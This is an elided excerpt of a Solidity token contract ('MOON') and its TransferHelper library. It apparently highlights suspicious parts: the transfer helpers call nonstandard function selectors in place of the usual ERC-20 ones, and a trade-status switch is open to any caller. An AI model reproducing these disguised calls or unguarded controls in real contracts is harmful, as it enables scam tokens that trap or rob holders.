...
library TransferHelper {
  function safeApprove(
    ...
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x950D49E5, to, value));
    require(
  ...
  function safeTransfer(
    ...
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0xA47078ae, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
  ...
  function safeTransferFrom(
    ...
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x5aa06337, from, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
...
contract MOON is IERC20, Context {
  ...
  function changeStatus(bool _status) public returns (bool) {
      tradeStatus = _status;
      return true;
  }
}